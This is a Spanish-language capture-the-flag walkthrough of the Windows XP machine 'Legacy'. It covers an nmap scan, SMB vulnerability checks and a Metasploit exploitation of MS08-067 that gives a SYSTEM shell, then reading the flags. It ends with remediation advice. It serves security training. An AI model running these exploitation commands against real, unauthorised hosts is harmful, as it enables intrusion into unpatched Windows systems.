Resumen

Legacy es un Windows XP de manual: SMB sin parchear y un exploit remoto que te da SYSTEM directo. Es de la vieja escuela, de cuando bastaba un fallo en el servicio Server para reventar media red — el mismo que aprovechó el gusano Conficker en 2008. Cortita, pero perfecta para entender por qué existen los parches de Microsoft.

Vulnerabilidad

MS08-067 — CVE-2008-4250 (Crítica · 10.0)

Es un desbordamiento en el servicio Server de Windows (la función NetPathCanonicalize de netapi32.dll). Una petición RPC maliciosa a través de SMB corrompe la memoria y permite ejecución remota de código sin autenticación, con privilegios de SYSTEM. Es el mismo fallo que propagó Conficker en 2008. Aquí también funcionaría MS17-010, pero MS08-067 es el camino canónico en un XP.

Reconocimiento

Arranco con el escaneo completo de puertos

┌──(jaime㉿kali)-[~]└─$ sudo nmap -p- -Pn -sS -n --min-rate 5000 legacy
PuertoServicioVersión
135msrpcMicrosoft Windows RPC
139netbios-ssnMicrosoft Windows netbios-ssn
445microsoft-dsWindows XP microsoft-ds

Solo SMB y RPC, y un banner que grita Windows XP. En un XP expuesto, lo primero es comprobar los boletines de SMB.

Enumeración

Los propios scripts de Nmap chivan si es vulnerable a los boletines de SMB

┌──(jaime㉿kali)-[~]└─$ sudo nmap -p 139,445 --script smb-vuln-ms08-067,smb-vuln-ms17-010 legacy
| smb-vuln-ms08-067: | VULNERABLE: Microsoft Windows system vulnerable to remote code execution (MS08-067) | State: VULNERABLE

Confirmado: vulnerable a MS08-067. Con eso hay ejecución remota como SYSTEM sin tocar credenciales.

Explotación

Con Metasploit es inmediato.

Paso 1 — configurar el exploit.

┌──(jaime㉿kali)-[~]└─$ msfconsole -q
msf6 > use exploit/windows/smb/ms08_067_netapi msf6 > set RHOSTS legacy msf6 > set LHOST tun0 msf6 > run

Paso 2 — qué pasa por detrás. El exploit envía la petición RPC manipulada al servicio Server, desborda netapi32.dll y ejecuta el payload. Como el servicio corre con el máximo privilegio, la sesión entra ya como NT AUTHORITY\SYSTEM.

Paso 3 — confirmar.

C:\WINDOWS\system32> whoami nt authority\system

Hay también versiones manuales en Exploit-DB (por ejemplo el 40279.py), donde solo hay que ajustar la IP objetivo y la shellcode de la reverse shell.

Escalada de privilegios

No hace falta escalar: MS08-067 ejecuta directamente como SYSTEM, el privilegio máximo en Windows. Las dos flags son nuestras sin más pasos.

Flags

La de usuario, en el escritorio de john

C:\> type "C:\Documents and Settings\john\Desktop\user.txt"

Y la de root, en el de Administrator

C:\> type "C:\Documents and Settings\Administrator\Desktop\root.txt"

Cómo se arregla

  • Aplicar MS08-067: el parche salió en octubre de 2008. En sistemas tan antiguos la única solución real es parchear y, sobre todo, migrar fuera de Windows XP, que lleva años sin soporte.
  • No exponer SMB: los puertos 139/445 nunca deberían estar accesibles desde fuera; cortafuegos y segmentación.
  • Deshabilitar SMBv1: protocolo obsoleto e inseguro, origen de media docena de exploits críticos.

Conclusiones

Legacy resume la época dorada de los exploits de SMB: un sistema sin parchear se cae con un solo paquete y te da SYSTEM sin credenciales.

La lección es doble: parchear a tiempo y no exponer servicios internos como SMB. Un XP en 2026 no es un reto, es un incidente esperando a pasar.
